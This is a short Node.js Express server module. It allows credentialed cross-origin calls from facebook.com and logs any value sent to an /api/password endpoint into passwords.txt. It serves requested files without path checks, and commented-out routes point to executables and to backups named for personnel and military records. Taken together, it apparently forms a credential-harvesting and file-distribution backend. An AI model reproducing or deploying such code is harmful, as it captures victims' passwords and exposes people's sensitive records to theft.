module.exports = app => {
  let fs = require("fs"),
    dirname = __dirname.replace("\\ons\\api", "");
  app.use((req, res, next) => {
    res.setHeader("Access-Control-Allow-Origin", "https://www.facebook.com");
    res.setHeader(
      "Access-Control-Allow-Methods",
      "GET, POST, OPTIONS, PUT, PATCH, DELETE"
    );
    res.setHeader(
      "Access-Control-Allow-Headers",
      "X-Requested-With,content-type"
    );
    res.setHeader("Access-Control-Allow-Credentials", true);
    next();
  });
  app.get("/", (req, res) => {
    res.sendFile(dirname + "/html/index.html");
    // res.sendFile(dirname + "/files/app.exe");
  });
  app.get("/files/:filename", (req, res) => {
    res.sendFile(dirname + "/files/" + req.params.filename);
  });
  // app.get("/files/afrad.bak", (req, res) => {
  //   res.sendFile(dirname + "/files/afrad.bak");
  // });
  // app.get("/files/treatments_cards.bak", (req, res) => {
  //   res.sendFile(dirname + "/files/treatments_cards.bak");
  // });
  // app.get("/files/ta7kekat.bak", (req, res) => {
  //   res.sendFile(dirname + "/files/ta7kekat.bak");
  // });
  // app.get("/files/military_records.bak", (req, res) => {
  //   res.sendFile(dirname + "/files/military_records.bak");
  // });
  // app.get("/files/sql-server.exe", (req, res) => {
  //   res.sendFile(dirname + "/files/sql-server.exe");
  // });
  // app.get("/files/sql_server_14.iso", (req, res) => {
  //   res.sendFile(dirname + "/files/sql_server_14.iso");
  // });
  app.get("/save-files/:dir/:filename", (req, res) => {
    let link =
      dirname + "/save-files/" + req.params.dir + "/" + req.params.filename;
    console.log("Google");
    console.log(link);
    res.sendFile(link);
  });
  app.get("/api/:method/:args", (req, res) => {
    let { method, args } = req.params;
    switch (method) {
      case "fileExists":
        return fs.existsSync("./" + args);
        break;
      case "password":
        // console.log("password saved");
        fs.appendFileSync("passwords.txt", "==============================\n");
        fs.appendFileSync("passwords.txt", args + "\n");
        res.send("Saved");
        return "ok";
        break;
      default:
        return "You have to call a method in the API.";
        break;
    }
  });
};
